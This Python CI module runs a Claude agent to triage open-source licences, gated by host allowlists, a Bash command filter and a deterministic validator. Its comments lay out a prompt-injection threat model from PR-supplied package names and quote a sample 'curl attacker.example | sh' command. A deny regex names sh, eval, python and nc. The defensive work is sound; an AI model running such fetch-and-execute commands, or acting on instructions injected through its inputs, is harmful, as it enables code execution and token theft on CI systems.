#!/usr/bin/env python3
# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
"""OSRB triage agent: deterministic pre-pass -> agent loop -> deterministic validator.

Supersedes the private GitLab "Hinton" OSRB reviewer (ci-vss-oss,
``ci/osrb_review/review.py``, marker ``<!-- hinton-osrb-review -->``). Hinton
ran privately because its approval evidence lived in NVBugs and Sheets, and
every one of its known failure modes — INCONCLUSIVE on gateway errors,
prompt-too-long, missing service-account JSON, evidence-collection errors —
came from that private-side dependency. The evidence now lives in this
repository (``approved.csv``, ``conditions.csv``, ``inventory.csv``), so the
triage can run publicly, with citations any reader can check.

Three stages, strictly separated:

1. **Deterministic pre-pass** (pure functions, no model): classify the
   license-diff delta and the osrb-compliance rows into a ``TriageInput``.
   Licence comparisons are normalised via ``osrb_summary.normalize_license``
   ("MIT License" vs "MIT" is NOT a change).
2. **Agent loop** (``claude-agent-sdk``, guarded import): the model researches
   ONLY the ``new_unknowns`` and ``license_changes`` rows against public
   registries and returns JSON verdicts.
3. **Deterministic validator** (the Hinton lesson: a model cannot be the last
   word): every verdict is re-verified — evidence re-fetched and matched,
   licence exact-permissive per the repo allowlist, not denylisted, not under
   an OSRB condition, registry provenance per ``osrb_seed.REGISTRY_EVIDENCE`` —
   before it can clear a package or touch ``inventory.csv``.

Prompt-injection boundary
-------------------------
The agent NEVER reads PR-authored files. Its inputs are the committed CSVs
this module hands it and public registries reached via ``curl`` (pypi.org,
registry.npmjs.org, api.github.com, upstream LICENSE files). A pull request
therefore cannot place text in front of the model and cannot instruct it.
The model is also never the last word: the deterministic validator above is
the trust boundary, and an unverifiable verdict is discarded, not trusted.

Usage:
    python3 .github/osrb/osrb_agent.py \\
        --delta license-diff.csv --compliance osrb-compliance.csv \\
        --inventory .github/osrb/inventory.csv \\
        --approved .github/osrb/approved.csv \\
        --conditions .github/osrb/conditions.csv \\
        --comment-out triage-comment.md --verdicts-out triage-verdicts.json \\
        [--skip-agent] [--max-unknowns N]

Exit codes: 0 ok; 2 validator rejected (or could not parse) agent output —
the comment is still written, fail-safe; 3 the agent hit max_turns (treated
like 2). The comment and verdicts files are written on EVERY path.
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from osrb_compare import (  # noqa: E402
    DENYLISTED,
    VERDICT_LICENSE_DRIFT,
    VERDICT_NOT_APPROVED,
    VERDICT_OSRB_CONDITIONAL,
    VERDICT_OSRB_REFUSED,
    VERDICT_USAGE_DRIFT,
    VERDICT_VERSION_DRIFT,
    canonical_package,
    is_permissive,
    load_conditions,
)
from osrb_scan import license_risk  # noqa: E402
from osrb_seed import REGISTRY_EVIDENCE  # noqa: E402
from osrb_summary import (  # noqa: E402
    license_is_unknown,
    markdown_cell,
    normalize_license,
    review_category,
)

MARKER = "<!-- osrb-triage -->"

TIMEOUT = 20
UA = {"User-Agent": "vss-osrb-triage/1.0"}

# Bytes of a fetched evidence document the validator will look at. Licence
# labels live in registry JSON or a LICENSE file header; half a megabyte is
# generous, and a bound keeps a hostile URL from becoming a memory problem.
FETCH_LIMIT = 512 * 1024

DEFAULT_MODEL = "claude-opus-5"
MAX_TURNS = int(os.environ.get("OSRB_TRIAGE_MAX_TURNS", "80"))

# Hosts and host fragments that must never appear in a public PR comment.
# Same idea as the approved.csv generation documented in README.md: the
# internal provenance (NVBug ids, sheets, employee-facing hosts) stays
# internal; anything matching a probe is replaced, never partially kept.
# The ONLY hosts the validator will fetch evidence from. This is the trust
# anchor: the model may CLAIM any licence, but the claim is only accepted if it
# appears in a document served by one of these registries. Without the
# allowlist, an attacker who controls the evidence host supplies both the claim
# and its "proof" — and a package name reaches the model from a PR-authored
# lockfile, so a hostile new dependency could clear itself. Match the hostname
# EXACTLY (no suffix check: `pypi.org.evil.com` must not pass).
EVIDENCE_HOSTS = frozenset({
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
    "api.github.com",
    "raw.githubusercontent.com",
})


def is_allowed_evidence_url(url: str) -> bool:
    """True only for an https URL whose host is exactly an allowlisted registry."""
    try:
        parts = urllib.parse.urlsplit(url)
    except ValueError:
        return False
    return (
        parts.scheme == "https"
        and (parts.hostname or "").lower() in EVIDENCE_HOSTS
        and not is_internal_url(url)
    )


INTERNAL_URL_PROBES = (
    "gitlab-master.nvidia.com",
    "nvbugs",
    "nvbugspro",
    "prod.api.nvidia.com",
    "confluence.nvidia.com",
    "jirasw.nvidia.com",
    "sharepoint.com",
    "docs.google.com",
    "drive.google.com",
    "nvidia.sharepoint",
)

_URL_RE = re.compile(r"https?://[^\s|)\]\"'>]+")

# Delta `change` values that are package deltas; the scanner's two
# non-delta classes (UNCOVERED_SOURCE / USED_UNDECLARED) are other
# workflows' findings and never OSRB triage rows.
_PACKAGE_CHANGES = {"added", "updated", "removed"}


# ---------------------------------------------------------------------------
# CSV plumbing
# ---------------------------------------------------------------------------

def load_rows(path: str) -> list[dict[str, str]]:
    with open(path, newline="", encoding="utf-8") as handle:
        return [dict(row) for row in csv.DictReader(handle)]


def load_inventory(path: str) -> tuple[list[str], list[dict[str, str]]]:
    with open(path, newline="", encoding="utf-8") as handle:
        reader = csv.DictReader(handle)
        return list(reader.fieldnames or []), [dict(row) for row in reader]


def write_inventory(path: str, fields: list[str], rows: list[dict[str, str]]) -> None:
    """LF line endings, same writer shape as osrb_seed — the committed file
    must not flip every line ending when one licence is seeded."""
    with open(path, "w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=fields, lineterminator="\n")
        writer.writeheader()
        writer.writerows(rows)


# ---------------------------------------------------------------------------
# Stage 1 — deterministic pre-pass (pure, no model, no network)
# ---------------------------------------------------------------------------

def _conditions_hits(
    conditions: list[dict[str, str]], package: str
) -> list[dict[str, str]]:
    """Every refusal/conditional row for this package, module-blind.

    Deliberately stricter than ``osrb_compare.conditions_for``: a package OSRB
    refused or conditioned is never auto-cleared anywhere, so triage matches on
    the package alone and lets the quoted condition tell the reader the scope.
    """
    key = canonical_package(package)
    return [
        row
        for row in conditions
        if canonical_package(row.get("package", "")) == key
    ]


def build_triage_input(
    delta_rows: list[dict[str, str]],
    compliance_rows: list[dict[str, str]],
    conditions: list[dict[str, str]],
) -> dict[str, list]:
    """Classify the scan outputs into the TriageInput buckets.

    ``license_changes`` reuses ``osrb_summary.review_category`` so the
    normalisation is the same one the overview uses — "MIT License" vs "MIT"
    is not a change, and an updated row where either side is UNKNOWN is not a
    licence change (it is unresolved, and lands in ``new_unknowns`` when the
    new side is the unknown one).
    """
    new_deps: list[dict[str, str]] = []
    license_changes: list[dict[str, str]] = []
    new_unknowns: list[dict[str, str]] = []
    removed: list[dict[str, str]] = []
    refused_or_conditional: list[dict] = []

    for row in delta_rows:
        change = row.get("change", "").strip().lower()
        if change not in _PACKAGE_CHANGES:
            continue
        if change == "removed":
            removed.append(row)
            continue
        if change == "added":
            new_deps.append(row)
        if review_category(row) == "license_changed":
            license_changes.append(row)
        if license_is_unknown(row.get("new_license", "")):
            new_unknowns.append(row)
        hits = _conditions_hits(conditions, row.get("package", ""))
        if hits:
            refused_or_conditional.append({"row": row, "conditions": hits})

    usage_drift = [
        row
        for row in compliance_rows
        if row.get("verdict", "").strip().upper() == VERDICT_USAGE_DRIFT
    ]

    return {
        "new_deps": new_deps,
        "license_changes": license_changes,
        "usage_drift": usage_drift,
        "new_unknowns": new_unknowns,
        "refused_or_conditional": refused_or_conditional,
        "removed": removed,
    }


# Package names the state comparison flags that are not third-party
# distributions: NVIDIA first-party code, and the base-image / OS packages whose
# licence lives inside a built image, not in any registry. They dominate the raw
# NOT_APPROVED count and would drown the real gaps, so the repo-state summary
# lists the third-party rest inline and puts the base-image/OS packages in a
# separate collapsed list.
_FIRST_PARTY_RE = re.compile(
    r"^(nvidia-vss|vss[-_]|vss$|deep[-_]search|cv[-_]pipeline|gst[-_]video[-_]sei|"
    r"vllm[-_]cosmos|nvidia-rag|tritonserver|triton[-_]python[-_]backend|pyds|"
    r"pynvvideocodec)",
    re.IGNORECASE,
)
_ARTIFACT_RE = re.compile(r"^\$\{|\.deb$|\.tar\.|^install\.|\.org$|^https?://")
_IMAGE_LANGS = {"container", "deb", "apk"}


def _not_approved_class(row: dict[str, str]) -> str:
    package = row.get("package", "")
    if _ARTIFACT_RE.search(package):
        return "artifact"
    if _FIRST_PARTY_RE.match(canonical_package(package)):
        return "first_party"
    if row.get("language", "") in _IMAGE_LANGS:
        return "base_image"
    return "third_party"


# Canonical identifiers probed against the allowlist to render the summary.
# The summary is COMPUTED, not written down: a licence only appears here if
# `is_permissive` actually clears it, so the comment cannot claim a policy the
# code does not enforce. Adding a licence to PERMISSIVE_LICENSE_PATTERNS
# without adding its identifier here understates the list, never overstates it.
_PERMISSIVE_PROBE = (
    "Apache-2.0", "MIT", "BSD-2-Clause", "BSD-3-Clause", "0BSD", "ISC",
    "Python-2.0", "PSF-2.0", "CNRI-Python", "Public Domain", "Unlicense",
    "CC0-1.0", "Zlib", "BSL-1.0", "BlueOak-1.0.0", "MPL-2.0", "LGPL-2.1",
    "UPL-1.0",
)


def permissive_summary() -> list[str]:
    """The licences `is_permissive` currently clears, in probe order."""
    return [name for name in _PERMISSIVE_PROBE if is_permissive(name)]


def _needs_no_osrb_review(row: dict[str, str]) -> bool:
    """True when a LICENSE_DRIFT row asks nothing of OSRB.

    The comment exists to tell OSRB what to review; the compliance artifact
    carries every difference either way. What OSRB reviews is the licence the
    repository actually ships, so a drift is only worth their time when that
    licence is not permissive. Whether it also disagrees with the approved
    baseline is a records question, not a review question.

    Trusting the shipped licence here is the same call the pipeline already
    makes everywhere else: the permissive gate clears thousands of NOT_APPROVED
    rows on exactly this signal, and check_python_licenses.py enforces it on
    every commit. Treating it as untrustworthy for drift alone was inconsistent
    -- and wrong on the facts. The rows this used to keep (arize-phoenix-otel
    "Elastic-2.0", cuda-pathfinder and nvidia-ml-py "Nvidia Proprietary") are
    all Apache-2.0/BSD upstream on PyPI: the baseline was stale, not the scan.
    """
    return is_permissive(row.get("license", ""))


def summarize_repo_state(compliance_rows: list[dict[str, str]]) -> dict:
    """Whole-repo state vs the approved baseline, for the report-only section.

    This is NOT the PR delta — it is every inventory row's verdict, so a
    reviewer can see the refusals, conditions and licence disagreements that
    predate this PR without downloading the compliance CSV. The NOT_APPROVED
    pile is split so the ~40 genuinely-unapproved third-party packages are not
    lost among base-image OS packages (which need an image SBOM, not an OSRB
    submission) and first-party names.
    """
    counts: dict[str, int] = {}
    for row in compliance_rows:
        verdict = row.get("verdict", "").strip().upper()
        counts[verdict] = counts.get(verdict, 0) + 1

    def _rows(verdict: str) -> list[dict[str, str]]:
        return [
            r for r in compliance_rows
            if r.get("verdict", "").strip().upper() == verdict
        ]

    na_class: dict[str, int] = {}
    na_rows: dict[str, list[dict[str, str]]] = {}
    for row in _rows(VERDICT_NOT_APPROVED):
        key = _not_approved_class(row)
        na_class[key] = na_class.get(key, 0) + 1
        na_rows.setdefault(key, []).append(row)

    return {
        "counts": counts,
        "refused": _rows(VERDICT_OSRB_REFUSED),
        "conditional": _rows(VERDICT_OSRB_CONDITIONAL),
        "license_drift": [
            r for r in _rows(VERDICT_LICENSE_DRIFT) if not _needs_no_osrb_review(r)
        ],
        "license_relabel_count": sum(
            1 for r in _rows(VERDICT_LICENSE_DRIFT) if _needs_no_osrb_review(r)
        ),
        "version_drift_count": counts.get(VERDICT_VERSION_DRIFT, 0),
        "not_approved_class": na_class,
        "not_approved_rows": na_rows,
    }


def research_rows(triage: dict[str, list]) -> list[dict[str, str]]:
    """The agent's work list: new unknowns + licence changes, deduplicated.

    Order is deterministic (new_unknowns first, then license_changes, each in
    delta order) so --max-unknowns cuts the same rows on every rerun.
    """
    seen: set[tuple[str, str, str]] = set()
    out: list[dict[str, str]] = []
    for row in triage["new_unknowns"] + triage["license_changes"]:
        key = (
            canonical_package(row.get("package", "")),
            row.get("new_version", ""),
            row.get("language", ""),
        )
        if key in seen:
            continue
        seen.add(key)
        out.append(row)
    return out


# ---------------------------------------------------------------------------
# Public-comment scrubbing
# ---------------------------------------------------------------------------

def is_internal_url(url: str) -> bool:
    lowered = url.lower()
    return any(probe in lowered for probe in INTERNAL_URL_PROBES)


# Bare internal references that carry no scheme: NVBug / bug ids, and
# Google Drive / Sheets document ids (25+ char base64-ish tokens). These reach
# the comment through conditions.csv cells and agent reasoning, and a
# URL-only scrub never sees them.
_ID_PROBES = (
    re.compile(r"\bnvbug[s]?(?:pro)?\W{0,3}\d{4,}", re.IGNORECASE),
    re.compile(r"\b(?:google\s+)?(?:sheet|doc|drive)\W{0,6}[A-Za-z0-9_-]{25,}", re.IGNORECASE),
    # any bare internal NVIDIA host that is not the public github/pypi surface
    re.compile(r"\b[\w.-]*\.nvidia\.com\b(?:/[^\s|)\]]*)?", re.IGNORECASE),
    # a Drive/Sheets path segment: `/spreadsheets/d/<id>` or `/d/<id>` and the
    # id itself, since redacting the host first can strand the path.
    re.compile(r"(?:/spreadsheets)?/d/[A-Za-z0-9_-]{25,}", re.IGNORECASE),
)


def scrub_internal(text: str) -> str:
    """Remove every internal reference, whatever its form.

    Three passes, because internal data reaches the public comment three ways:
    a full URL, a bare internal HOST (``gitlab-master.nvidia.com/...`` with no
    scheme, from a pasted condition), and a bare id (``NVBug 1234567``, a Drive
    doc id). A URL-only scrub — the original — caught only the first, and this
    comment is a hard 'no internal references' surface, so all three are
    redacted. Redaction keeps the cell shape so tables stay tables.
    """
    text = _URL_RE.sub(
        lambda m: "[internal link removed]" if is_internal_url(m.group(0)) else m.group(0),
        text,
    )
    # Bare ids and whole internal hosts FIRST — the *.nvidia.com catch-all must
    # consume a host as one unit before any substring probe nibbles a prefix off
    # it and strands the '.nvidia.com' tail.
    for probe in _ID_PROBES:
        text = probe.sub("[internal reference removed]", text)
    # Then any remaining keyword substrings (docs.google.com, sharepoint.com,
    # bare 'nvbugs' with no host). Longest first so 'nvbugspro' beats 'nvbugs'.
    lowered = text.lower()
    for probe in sorted(INTERNAL_URL_PROBES, key=len, reverse=True):
        if probe in lowered:
            text = re.compile(re.escape(probe), re.IGNORECASE).sub(
                "[internal reference removed]", text
            )
            lowered = text.lower()
    return text


# ---------------------------------------------------------------------------
# Stage 2 — agent loop (guarded SDK import; module works without it)
# ---------------------------------------------------------------------------

AGENT_SYSTEM_PROMPT = """\
You are the OSRB licence-triage agent for the public NVIDIA VSS repository.
You receive a JSON array of dependency rows (package, version, language,
change, old_license, new_license, repository_url, module). For EACH row,
determine the licence of that exact package version.

Research ONLY via the Bash tool running `curl` against public registries:
  - python:        https://pypi.org/pypi/<name>/<version>/json
  - node:          https://registry.npmjs.org/<name>
  - github-action: https://api.github.com/repos/<owner>/<repo>/license
  - fallback:      the upstream repository's LICENSE file (e.g. on
                   raw.githubusercontent.com), located from the registry
                   metadata or repository_url.

Hard rules:
  - Do NOT read, list, or search any file in the repository checkout. Your
    only inputs are this prompt and the public registries above.
  - Run nothing except curl (add `-sL --max-time 20` to every call).
  - evidence_url must be a public https URL whose response literally contains
    the licence you claim. A deterministic validator re-fetches every
    evidence_url and DISCARDS your verdict when the licence is not in the
    document, so pick the URL that shows it (the registry JSON or the LICENSE
    file itself).
  - permissive=true only for a single unambiguous permissive licence (MIT,
    BSD, Apache-2.0, ISC, ...). Composite expressions (AND/OR/WITH), copyleft,
    unknown, or ambiguous metadata => permissive=false, needs_osrb=true.

Output format — JSON ONLY:
Your final message must be EXACTLY ONE fenced ```json code block containing a
JSON array with one object per input row:
  {"package": str, "version": str, "language": str, "license": str,
   "evidence_url": str, "evidence_quote": str, "permissive": bool,
   "needs_osrb": bool, "reasoning": str}
No prose before or after the block. Any row you could not resolve still gets
an object, with license "UNKNOWN", permissive=false, needs_osrb=true.
"""

VERDICT_KEYS = (
    "package", "version", "language", "license", "evidence_url",
    "evidence_quote", "permissive", "needs_osrb", "reasoning",
)


def build_agent_prompt(rows: list[dict[str, str]]) -> str:
    payload = [
        {
            "package": row.get("package", ""),
            "version": row.get("new_version", "") or row.get("version", ""),
            "language": row.get("language", ""),
            "change": row.get("change", ""),
            "old_license": row.get("old_license", ""),
            "new_license": row.get("new_license", ""),
            "repository_url": row.get("repository_url", ""),
            "module": row.get("module", ""),
        }
        for row in rows
    ]
    return (
        "Research the licence of each of these dependency rows and emit the "
        "JSON verdict array per your instructions.\n\n"
        + json.dumps(payload, indent=2)
    )


def parse_agent_verdicts(text: str) -> tuple[list[dict], str]:
    """Parse the agent's final text into verdict dicts, defensively.

    Returns ``(verdicts, error)``. ``error`` is non-empty when nothing usable
    could be parsed; individually malformed entries are simply dropped (their
    packages then surface as "agent verdict unverifiable" because no verdict
    covers them).
    """
    candidates: list[str] = []
    for match in re.finditer(r"```(?:json)?\s*\n(.*?)```", text, re.DOTALL):
        candidates.append(match.group(1))
    start = text.find("[")
    if start != -1:
        candidates.append(text[start:text.rfind("]") + 1])

    parsed = None
    for candidate in reversed(candidates):
        try:
            value = json.loads(candidate)
        except ValueError:
            continue
        if isinstance(value, list):
            parsed = value
            break
        if isinstance(value, dict):
            parsed = [value]
            break
    if parsed is None:
        return [], "no JSON verdict array found in agent output"

    verdicts = []
    for item in parsed:
        if not isinstance(item, dict):
            continue
        if not str(item.get("package", "")).strip():
            continue
        verdict = {key: item.get(key, "") for key in VERDICT_KEYS}
        verdict["permissive"] = bool(item.get("permissive", False))
        verdict["needs_osrb"] = bool(item.get("needs_osrb", True))
        for key in ("package", "version", "language", "license",
                    "evidence_url", "evidence_quote", "reasoning"):
            verdict[key] = str(verdict[key] or "").strip()
        verdicts.append(verdict)
    if not verdicts:
        return [], "agent output parsed but contained no usable verdicts"
    return verdicts, ""


# Commands the agent's Bash tool may run. The agent takes PR-authored package
# names as input, so its shell is an injection target: without this, an
# attacker's dependency name could drive `curl attacker.example | sh` or read
# a persisted git token. The agent only ever needs to GET a registry document,
# so allow exactly that and nothing else. Independent of any workflow-level
# env scoping — defence at the layer the untrusted input reaches.
_ALLOWED_CURL_HOSTS = EVIDENCE_HOSTS  # same registries the validator trusts
_CURL_URL_RE = re.compile(r"https://\S+")


def bash_command_allowed(command: str) -> tuple[bool, str]:
    """True only for a plain curl/GET against an allowlisted registry host.

    Deliberately strict and structural, not a denylist: one command, a curl or
    wget, every URL in it on the registry allowlist, and none of the shell
    metacharacters that chain or redirect (semicolons, pipes, redirects,
    backticks, command substitution). A licence
    lookup needs none of those, and every one of them is an exfiltration or
    execution primitive.
    """
    text = command.strip()
    if not text:
        return False, "empty command"
    if re.search(r"[;&|`]|\$\(|>|<|\bsh\b|\beval\b|\bpython\b|\bnc\b", text):
        return False, "shell contains chaining/redirection/exec metacharacters"
    head = text.split(None, 1)[0]
    if head not in ("curl", "wget"):
        return False, f"only curl/wget permitted, not {head!r}"
    urls = _CURL_URL_RE.findall(text)
    if not urls:
        return False, "no https URL in command"
    for url in urls:
        if not is_allowed_evidence_url(url):
            return False, f"URL host not on the registry allowlist: {url}"
    return True, "ok"


async def _bash_gate(tool_name, tool_input, _context):
    """SDK permission callback: veto any Bash command that is not a registry GET."""
    if tool_name != "Bash":
        return {"behavior": "deny", "message": f"tool {tool_name} is not permitted"}
    ok, reason = bash_command_allowed(str((tool_input or {}).get("command", "")))
    if ok:
        return {"behavior": "allow", "updatedInput": tool_input}
    return {"behavior": "deny", "message": f"blocked: {reason}"}


async def _run_agent_async(rows: list[dict[str, str]]) -> tuple[str, bool]:
    """One bounded SDK session. Returns (final_text, hit_max_turns).

    Mirrors .github/helm-sync/helm_sync_agent.py: ClaudeAgentOptions,
    allowed_tools, max_turns, bypassPermissions, ANTHROPIC_MODEL override.
    """
    from claude_agent_sdk import (  # type: ignore
        AssistantMessage, ClaudeAgentOptions, ClaudeSDKClient,
        ResultMessage, TextBlock, ToolUseBlock,
    )

    model = os.environ.get("ANTHROPIC_MODEL") or DEFAULT_MODEL
    print(f"[osrb-agent] starting · rows={len(rows)} model={model} "
          f"max_turns={MAX_TURNS}", file=sys.stderr, flush=True)

    # NOT bypassPermissions: the agent's input is attacker-influenced (package
    # names come from PR lockfiles), so every Bash call is gated by _bash_gate
    # to a registry GET. can_use_tool is the SDK's per-call veto; if this SDK
    # build lacks it, the run refuses rather than falling back to unrestricted
    # Bash — a compliance agent must not degrade open.
    try:
        options = ClaudeAgentOptions(
            system_prompt=AGENT_SYSTEM_PROMPT,
            allowed_tools=["Bash"],
            model=model,
            max_turns=MAX_TURNS,
            permission_mode="default",
            can_use_tool=_bash_gate,
        )
    except TypeError as exc:  # can_use_tool unsupported in this SDK version
        raise RuntimeError(
            "claude_agent_sdk build does not support can_use_tool; refusing to "
            "run the agent without the Bash command gate"
        ) from exc

    final_text: list[str] = []
    hit_max_turns = False
    async with ClaudeSDKClient(options=options) as client:
        await client.query(build_agent_prompt(rows))
        async for msg in client.receive_response():
            if isinstance(msg, AssistantMessage):
                for block in msg.content:
                    if isinstance(block, TextBlock) and block.text:
                        final_text.append(block.text)
                    elif isinstance(block, ToolUseBlock):
                        cmd = str((getattr(block, "input", {}) or {}).get("command", ""))[:140]
                        print(f"  [tool] {getattr(block, 'name', '?')} :: "
                              f"{cmd.replace(chr(10), ' ')}",
                              file=sys.stderr, flush=True)
            elif isinstance(msg, ResultMessage):
                if getattr(msg, "stop_reason", None) == "max_turns":
                    hit_max_turns = True
                break
    return "\n".join(final_text), hit_max_turns


def run_agent(rows: list[dict[str, str]]) -> tuple[str, bool, str]:
    """Returns (final_text, hit_max_turns, error). Never raises."""
    if "CLAUDE_CODE_DISABLE_THINKING" not in os.environ:
        # The NVIDIA Anthropic proxy rejects the SDK's default
        # context_management field; same defensive setting as helm-sync.
        os.environ["CLAUDE_CODE_DISABLE_THINKING"] = "1"
    try:
        import claude_agent_sdk  # noqa: F401
    except ImportError:
        return "", False, "claude-agent-sdk not installed"
    try:
        text, hit_max = asyncio.run(_run_agent_async(rows))
        return text, hit_max, ""
    except Exception as exc:  # noqa: BLE001 — report-only stage, never crash the comment
        return "", False, f"agent crashed: {exc!r}"


# ---------------------------------------------------------------------------
# Stage 3 — deterministic validator (the trust boundary; pure over fetched bytes)
# ---------------------------------------------------------------------------

def evidence_supports(claimed: str, fetched_text: str) -> bool:
    """True when the claimed licence appears in the fetched document.

    Word-bounded, case-insensitive, hyphen/whitespace-interchangeable match of
    either the claim or its normalised form — "Apache-2.0" is found in a
    document that says "Apache 2.0", but "MIT" is not found in "permitted".
    """
    if not claimed or not fetched_text:
        return False
    hay = re.sub(r"\s+", " ", fetched_text)
    for needle in {claimed.strip(), normalize_license(claimed)}:
        if not needle:
            continue
        pattern = re.escape(needle)
        # Treat runs of space/hyphen in the claim as interchangeable in the doc.
        pattern = re.sub(r"(?:\\[ -])+", r"[\\s_-]+", pattern)
        if re.search(rf"(?<![A-Za-z0-9]){pattern}(?![A-Za-z0-9])", hay, re.IGNORECASE):
            return True
    return False


def registry_provenanced(language: str, usage_evidence: str) -> bool:
    """Same rule as osrb_seed: only rows whose evidence proves the name came
    from the language registry may be answered by that registry. Languages
    osrb_seed has no resolver rule for are refused outright."""
    if language not in REGISTRY_EVIDENCE:
        return False
    allowed = REGISTRY_EVIDENCE[language]
    if allowed is None:  # github-action: the name IS the repo coordinate
        return True
    return bool(set((usage_evidence or "").split(";")) & allowed)


def index_inventory(
    inventory_rows: list[dict[str, str]]
) -> dict[tuple[str, str, str], list[dict[str, str]]]:
    index: dict[tuple[str, str, str], list[dict[str, str]]] = {}
    for row in inventory_rows:
        key = (
            canonical_package(row.get("package", "")),
            row.get("version", ""),
            row.get("language", ""),
        )
        index.setdefault(key, []).append(row)
    return index


def _is_exactly_permissive(licence: str, package: str = "") -> bool:
    """Stricter than `is_permissive`, deliberately: no composites at all.

    `is_permissive` answers "does this need OSRB review?", where SPDX
    semantics apply and "MIT OR GPL-3.0" is permissive because the recipient
    may elect MIT. This answers a different question -- may an agent's
    researched licence be written to the committed inventory with no human in
    the loop -- and there an election is a judgement call, not a lookup. A
    composite means the agent read a package whose licensing has a choice in
    it, which is exactly when a person should decide.
    """
    if re.search(r"\b(AND|OR|WITH)\b", licence or "", re.IGNORECASE):
        return False
    if "," in (licence or ""):
        return False
    return is_permissive(licence, package)


def validate_permissive_verdict(
    verdict: dict,
    fetched_text: str | None,
    inventory_rows: list[dict[str, str]],
    conditions: list[dict[str, str]],
    denylisted: set[str] | None = None,
) -> tuple[bool, str]:
    """Pure acceptance check for one permissive claim.

    ``fetched_text`` is the already-fetched evidence document (None = fetch
    failed), ``inventory_rows`` are the committed rows for this
    (package, version, language). Every path to True requires ALL of:
    verified evidence, exact-permissive licence, not denylisted, no OSRB
    condition on file, registry provenance.
    """
    package = verdict["package"]
    licence = verdict["license"]
    deny = DENYLISTED if denylisted is None else denylisted

    url = verdict.get("evidence_url", "")
    if not is_allowed_evidence_url(url):
        return False, (
            "evidence URL host is not an allowlisted registry "
            f"({', '.join(sorted(EVIDENCE_HOSTS))}) — agent verdict unverifiable"
        )
    if fetched_text is None:
        return False, "evidence re-fetch failed — agent verdict unverifiable"
    if not evidence_supports(licence, fetched_text):
        return False, ("claimed licence not found in fetched evidence — "
                       "agent verdict unverifiable")
    if canonical_package(package) in deny:
        return False, "package is on license_denylist.txt — never auto-cleared"
    if _conditions_hits(conditions, package):
        hit = _conditions_hits(conditions, package)[0]
        return False, (f"OSRB {hit.get('decision', 'condition')} on file "
                       f"({hit.get('evidence', '')}) — never auto-cleared")
    if not _is_exactly_permissive(licence, package):
        return False, (f"licence {licence!r} does not exactly match the "
                       "permissive allowlist")
    if not inventory_rows:
        return False, "package/version not present in the committed inventory"
    if not any(
        registry_provenanced(row.get("language", ""), row.get("usage_evidence", ""))
        for row in inventory_rows
    ):
        return False, ("no registry provenance (usage_evidence lacks "
                       "declared-manifest / container-pip) — a registry answer "
                       "may not speak for this row")
    return True, "verified"


def validate_verdicts(
    verdicts: list[dict],
    inventory_rows: list[dict[str, str]],
    conditions: list[dict[str, str]],
    fetch,
    denylisted: set[str] | None = None,
) -> tuple[list[dict], list[dict], list[dict]]:
    """Split agent verdicts into (validated, rejected, flagged).

    ``fetch`` is injected (url -> text | None) so tests need no network.
    Only ``validated`` may clear packages or touch the inventory; ``flagged``
    are the agent's own needs-OSRB verdicts, carried to the comment as-is.
    """
    index = index_inventory(inventory_rows)
    validated: list[dict] = []
    rejected: list[dict] = []
    flagged: list[dict] = []
    for verdict in verdicts:
        if not verdict.get("permissive"):
            flagged.append(dict(verdict))
            continue
        key = (
            canonical_package(verdict.get("package", "")),
            verdict.get("version", ""),
            verdict.get("language", ""),
        )
        url = verdict.get("evidence_url", "")
        # Gate the fetch itself on the allowlist, so a rejected verdict never
        # even causes a request to an attacker-controlled host.
        fetched = fetch(url) if is_allowed_evidence_url(url) else None
        ok, reason = validate_permissive_verdict(
            verdict, fetched, index.get(key, []), conditions, denylisted
        )
        entry = dict(verdict)
        entry["validation"] = reason
        (validated if ok else rejected).append(entry)
    return validated, rejected, flagged


def fetch_evidence(url: str) -> str | None:
    """Network edge for the validator; everything downstream is pure."""
    try:
        req = urllib.request.Request(url, headers=UA)
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.read(FETCH_LIMIT).decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, ValueError, OSError):
        return None


# ---------------------------------------------------------------------------
# Inventory update — same write shape as osrb_seed
# ---------------------------------------------------------------------------

def apply_verdicts_to_inventory(
    inventory_rows: list[dict[str, str]], validated: list[dict]
) -> int:
    """Write validated licences onto matching UNKNOWN inventory rows, in place.

    Only rows that are UNKNOWN and registry-provenanced are touched — the same
    two guards osrb_seed applies — and only license + risk change.
    Returns the number of rows updated.
    """
    changed = 0
    by_key = {
        (canonical_package(v["package"]), v["version"], v["language"]): v
        for v in validated
    }
    for row in inventory_rows:
        key = (
            canonical_package(row.get("package", "")),
            row.get("version", ""),
            row.get("language", ""),
        )
        verdict = by_key.get(key)
        if verdict is None:
            continue
        if not license_is_unknown(row.get("license", "")):
            continue
        if not registry_provenanced(
            row.get("language", ""), row.get("usage_evidence", "")
        ):
            continue
        row["license"] = verdict["license"]
        row["risk"] = license_risk(verdict["license"])
        changed += 1
    return changed


def validate_inventory_diff(
    old_rows: list[dict[str, str]], new_rows: list[dict[str, str]]
) -> list[str]:
    """Prove an inventory update touched ONLY license/risk on existing rows.

    Returns a list of problems; empty means the diff is exactly the shape this
    agent is allowed to produce (no added/removed/reordered rows, no column
    other than license and risk changed). The workflow calls this before
    committing, so a bug anywhere upstream aborts the commit instead of
    rewriting the inventory.
    """
    problems: list[str] = []
    if len(old_rows) != len(new_rows):
        return [f"row count changed: {len(old_rows)} -> {len(new_rows)}"]
    for i, (old, new) in enumerate(zip(old_rows, new_rows)):
        if set(old) != set(new):
            problems.append(f"row {i}: column set changed")
            continue
        for field in old:
            if field in ("license", "risk"):
                continue
            if old[field] != new[field]:
                problems.append(
                    f"row {i} ({old.get('package', '?')}): column "
                    f"{field!r} changed {old[field]!r} -> {new[field]!r}"
                )
    return problems


# ---------------------------------------------------------------------------
# Comment builder — pure function of TriageInput + validated results
# ---------------------------------------------------------------------------

def _table(headers: list[str], rows: list[list[str]]) -> list[str]:
    lines = ["| " + " | ".join(headers) + " |",
             "|" + "---|" * len(headers)]
    for row in rows:
        lines.append("| " + " | ".join(markdown_cell(cell) for cell in row) + " |")
    return lines


def _risk_band_moved(row: dict[str, str]) -> bool:
    return license_risk(row.get("old_license", "")) != license_risk(
        row.get("new_license", "")
    )


